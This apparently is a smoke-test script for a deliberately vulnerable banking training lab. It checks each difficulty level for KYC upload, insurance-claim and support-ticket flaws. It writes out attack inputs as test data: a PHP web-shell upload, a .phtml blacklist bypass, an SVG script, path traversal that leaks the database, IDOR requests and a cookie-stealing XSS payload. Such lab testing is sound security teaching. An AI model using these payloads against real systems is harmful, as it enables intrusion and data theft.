"""Stage 5 smoke test — KYC upload/download, claims, tickets.

Runs each lab level against a throwaway copy of the seeded database.
"""

import io
import json
import os
import re
import shutil
import sqlite3
import sys
import tempfile
import traceback

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, ROOT)

SRC_DB = os.path.join(ROOT, "db", "nusabank.db")
PW = "password"

PNG = (b"\x89PNG\r\n\x1a\n" + b"\x00" * 40)
PDF = b"%PDF-1.4\n% lab placeholder\n"
SVG = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'


def make_client(level, tmpdir):
    db_copy = os.path.join(tmpdir, f"nusabank-{level}.db")
    shutil.copyfile(SRC_DB, db_copy)
    uploads = os.path.join(tmpdir, f"uploads-{level}")
    # Copy the seeded KYC/claim placeholder files so IDOR downloads can be
    # exercised against real content.
    shutil.copytree(os.path.join(ROOT, "uploads"), uploads, dirs_exist_ok=True)
    os.environ.update(LAB_LEVEL=level, NUSABANK_DB=db_copy,
                      NUSABANK_UPLOADS=uploads, NUSABANK_COOKIE_SECURE="0")
    from app import create_app

    app = create_app({"DB_PATH": db_copy, "UPLOAD_DIR": uploads})
    return app.test_client(), db_copy, uploads


def login(c, username="budi01", password=PW):
    return c.post("/login", data={"username": username, "password": password},
                  follow_redirects=False)


def csrf_token(client, path="/support/new"):
    body = client.get(path).data.decode("utf-8", "replace")
    m = re.search(r'name="csrf_token" value="([^"]+)"', body)
    return m.group(1) if m else "nusabank-csrf-static-token"


def raw(db_path, sql, params=()):
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    try:
        return conn.execute(sql, params).fetchall()
    finally:
        conn.close()


def detail_id(client, path):
    body = client.get(path).data.decode("utf-8", "replace")
    m = re.search(r"/support/(\d+)", body)
    return int(m.group(1)) if m else None


def run(level):
    tmpdir = tempfile.mkdtemp(prefix=f"stage5-{level}-")
    out = {"level": level}
    try:
        c, db_path, uploads = make_client(level, tmpdir)
        out["login"] = login(c).status_code
        me = raw(db_path, "SELECT id FROM users WHERE username='budi01'")[0]["id"]
        other = raw(db_path, "SELECT id, username FROM users WHERE id != ? "
                             "AND username NOT LIKE 'admin%' ORDER BY id", (me,))[0]
        out["me"], out["other"] = me, other["username"]

        # ---------------- KYC upload (benign + malicious) -----------------
        out["kyc_page"] = c.get("/kyc/upload").status_code
        tok = csrf_token(c, "/kyc/upload")
        r = c.post("/kyc/upload",
                   data={"csrf_token": tok, "doc_type": "ktp",
                         "document": (io.BytesIO(PDF), "ktp.pdf")},
                   content_type="multipart/form-data", follow_redirects=False)
        out["kyc_upload_pdf"] = r.status_code
        row = raw(db_path, "SELECT * FROM kyc_documents WHERE user_id=? "
                           "ORDER BY id DESC LIMIT 1", (me,))[0]
        out["kyc_stored_name"] = row["stored_name"]
        out["kyc_randomized"] = not row["stored_name"].startswith("ktp")

        r = c.post("/kyc/upload",
                   data={"csrf_token": tok, "doc_type": "selfie",
                         "document": (io.BytesIO(SVG), "evil.svg")},
                   content_type="multipart/form-data", follow_redirects=False)
        out["kyc_upload_svg"] = r.status_code
        evil = raw(db_path, "SELECT * FROM kyc_documents WHERE user_id=? "
                            "ORDER BY id DESC LIMIT 1", (me,))[0]
        out["svg_stored"] = evil["stored_name"]
        out["svg_accepted"] = evil["stored_name"] == "evil.svg"

        # double extension / php
        r = c.post("/kyc/upload",
                   data={"csrf_token": tok, "doc_type": "lainnya",
                         "document": (io.BytesIO(b"<?php system($_GET[0]); ?>"),
                                      "shell.pdf.php")},
                   content_type="multipart/form-data", follow_redirects=False)
        out["kyc_upload_php"] = r.status_code
        last = raw(db_path, "SELECT * FROM kyc_documents WHERE user_id=? "
                            "ORDER BY id DESC LIMIT 1", (me,))[0]
        out["php_accepted"] = last["stored_name"] == "shell.pdf.php"

        # Blacklist bypass: .phtml is not on the medium blacklist.
        r = c.post("/kyc/upload",
                   data={"csrf_token": tok, "doc_type": "lainnya",
                         "document": (io.BytesIO(b"<?php echo 1; ?>"), "shell.phtml")},
                   content_type="multipart/form-data", follow_redirects=False)
        last = raw(db_path, "SELECT * FROM kyc_documents WHERE user_id=? "
                            "ORDER BY id DESC LIMIT 1", (me,))[0]
        out["phtml_accepted"] = last["stored_name"] == "shell.phtml"

        # ---------------- KYC IDOR -----------------------------------------
        foreign_doc = raw(db_path, "SELECT * FROM kyc_documents WHERE user_id != ? "
                                   "ORDER BY id LIMIT 1", (me,))[0]
        r = c.get(f"/kyc/download/{foreign_doc['id']}")
        out["kyc_idor"] = {"status": r.status_code, "bytes": len(r.data)}

        # ---------------- path traversal -----------------------------------
        # In Docker the escapes point at /app/db/nusabank.db etc.; the harness
        # instead reaches for the throwaway DB one level above the upload root.
        escape = "../" + os.path.basename(db_path)
        r = c.get("/uploads/" + escape)
        out["traversal_encoded"] = {"status": r.status_code,
                                    "db_leaked": b"SQLite format" in r.data}
        r = c.get("/uploads/legacy/flag.txt")
        out["legacy_flag_file"] = {"status": r.status_code,
                                   "flag": b"FLAG{" in r.data}

        # ---------------- claims -------------------------------------------
        out["insurance_page"] = c.get("/insurance").status_code
        my_policy = raw(db_path, "SELECT * FROM insurance_policies WHERE user_id=?",
                        (me,))
        foreign_policy = raw(db_path, "SELECT * FROM insurance_policies "
                                      "WHERE user_id != ? ORDER BY id", (me,))[0]
        out["policies_mine"] = len(my_policy)
        tok = csrf_token(c, "/insurance/claim")

        if my_policy:
            pol = my_policy[0]
            r = c.post("/insurance/claim",
                       data={"csrf_token": tok, "policy_id": pol["id"],
                             "amount": "-5000000", "description": "negative claim"},
                       follow_redirects=False)
            out["claim_negative"] = r.status_code
            over = pol["coverage"] * 5
            r = c.post("/insurance/claim",
                       data={"csrf_token": tok, "policy_id": pol["id"],
                             "amount": str(over), "description": "over coverage"},
                       follow_redirects=False)
            out["claim_over_coverage"] = r.status_code
            latest = raw(db_path, "SELECT * FROM claims WHERE user_id=? "
                                  "ORDER BY id DESC LIMIT 1", (me,))[0]
            out["claim_over_amount"] = latest["amount"]

            r = c.post("/insurance/claim",
                       data={"csrf_token": tok, "policy_id": pol["id"],
                             "amount": "1500000", "description": "normal claim",
                             "attachment": (io.BytesIO(PDF), "bukti.pdf")},
                       content_type="multipart/form-data", follow_redirects=False)
            out["claim_normal"] = r.status_code
            mine = raw(db_path, "SELECT * FROM claims WHERE user_id=? "
                                "ORDER BY id DESC LIMIT 1", (me,))[0]
            out["claim_attachment"] = mine["attachment"]

            # cumulative bypass: several claims that each pass in isolation
            for _ in range(3):
                c.post("/insurance/claim",
                       data={"csrf_token": tok, "policy_id": pol["id"],
                             "amount": str(pol["coverage"]),
                             "description": "cumulative"}, follow_redirects=False)
            total = raw(db_path, "SELECT SUM(amount) AS t FROM claims "
                                 "WHERE policy_id=? AND status='submitted' "
                                 "AND description='cumulative'", (pol["id"],))[0]["t"]
            out["claim_cumulative_total"] = total or 0
            out["claim_cumulative_allowed"] = (total or 0) > pol["coverage"]

        r = c.post("/insurance/claim",
                   data={"csrf_token": tok, "policy_id": foreign_policy["id"],
                         "amount": "1000000", "description": "foreign policy"},
                   follow_redirects=False)
        out["claim_foreign_policy"] = r.status_code

        # Put an admin note on the claimant's own newest claim so the
        # internal-note exposure can be observed.
        conn = sqlite3.connect(db_path)
        own_claim_id = raw(db_path, "SELECT id FROM claims WHERE user_id=? "
                                    "ORDER BY id DESC LIMIT 1", (me,))[0]["id"]
        conn.execute("UPDATE claims SET admin_note='Internal: lampiran kurang, "
                     "curigai pemalsuan.' WHERE id=?", (own_claim_id,))
        conn.commit()
        conn.close()
        r = c.get(f"/insurance/claim/{own_claim_id}")
        out["own_claim_note_leaked"] = b"catatan admin" in r.data.lower()

        foreign_claim = raw(db_path, "SELECT * FROM claims WHERE user_id != ? "
                                     "ORDER BY id LIMIT 1", (me,))[0]
        r = c.get(f"/insurance/claim/{foreign_claim['id']}")
        out["claim_idor"] = {"status": r.status_code,
                             "claim_no_leaked":
                                 foreign_claim["claim_no"].encode() in r.data}
        out["claim_admin_note_leaked"] = (
            b"Catatan admin" in r.data and bool(foreign_claim["admin_note"]))
        r = c.get(f"/insurance/claim/{foreign_claim['id']}/attachment")
        out["claim_attachment_idor"] = {"status": r.status_code,
                                        "flag": b"FLAG{" in r.data}

        # ---------------- tickets ------------------------------------------
        out["support_page"] = c.get("/support").status_code
        tok = csrf_token(c, "/support/new")
        payload = "<img src=x onerror=alert(document.cookie)>"
        r = c.post("/support/new",
                   data={"csrf_token": tok, "subject": "XSS " + payload,
                         "body": payload, "category": "teknis", "priority": "high"},
                   follow_redirects=False)
        out["ticket_create"] = r.status_code
        ticket = raw(db_path, "SELECT * FROM tickets WHERE user_id=? "
                              "ORDER BY id DESC LIMIT 1", (me,))[0]
        out["ticket_no_format"] = ticket["ticket_no"]
        r = c.get(f"/support/{ticket['id']}")
        out["ticket_xss"] = {"status": r.status_code,
                             "unescaped": payload.encode() in r.data}

        tok = csrf_token(c, f"/support/{ticket['id']}")
        r = c.post(f"/support/{ticket['id']}/comment",
                   data={"csrf_token": tok, "body": payload},
                   follow_redirects=False)
        out["ticket_comment"] = r.status_code
        out["ticket_status_after"] = raw(
            db_path, "SELECT status FROM tickets WHERE id=?", (ticket["id"],))[0]["status"]

        # internal note posted by a customer
        r = c.post(f"/support/{ticket['id']}/comment",
                   data={"csrf_token": tok, "body": "internal note",
                         "is_internal": "1"}, follow_redirects=False)
        intflag = raw(db_path, "SELECT is_internal FROM ticket_comments "
                               "WHERE ticket_id=? ORDER BY id DESC LIMIT 1",
                      (ticket["id"],))[0]["is_internal"]
        out["customer_can_set_internal"] = intflag == 1

        foreign_ticket = raw(db_path, "SELECT * FROM tickets WHERE user_id != ? "
                                      "ORDER BY id LIMIT 1", (me,))[0]
        r = c.get(f"/support/{foreign_ticket['id']}")
        out["ticket_idor"] = {"status": r.status_code,
                              "subject_leaked":
                                  foreign_ticket["subject"].encode() in r.data,
                              "internal_leaked": b"catatan internal" in r.data}
        r = c.post(f"/support/{foreign_ticket['id']}/comment",
                   data={"csrf_token": tok, "body": "hijack"},
                   follow_redirects=False)
        out["ticket_idor_comment"] = r.status_code

        # ---------------- admin can review (used in stage 7) ---------------
        admin = c.application.test_client()
        admin.post("/login", data={"username": "admin", "password": "NusaAdmin!2024"})
        r = admin.get("/support")
        out["admin_support"] = r.status_code
        r = admin.post(f"/support/{ticket['id']}/comment",
                       data={"csrf_token": csrf_token(admin, f"/support/{ticket['id']}"),
                             "body": "Status: diproses", "is_internal": "1"},
                       follow_redirects=False)
        out["admin_internal_comment"] = r.status_code
        own_view = c.get(f"/support/{ticket['id']}")
        out["own_ticket_internal_visible"] = b"catatan internal" in own_view.data

        out["ok"] = True
    except Exception as exc:  # noqa: BLE001
        out["ok"] = False
        out["error"] = f"{type(exc).__name__}: {exc}"
        out["trace"] = traceback.format_exc()[-1800:]
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
    return out


if __name__ == "__main__":
    levels = sys.argv[1:] or ["easy", "medium", "hard", "patched"]
    print(json.dumps([run(lv) for lv in levels], indent=1, default=str))
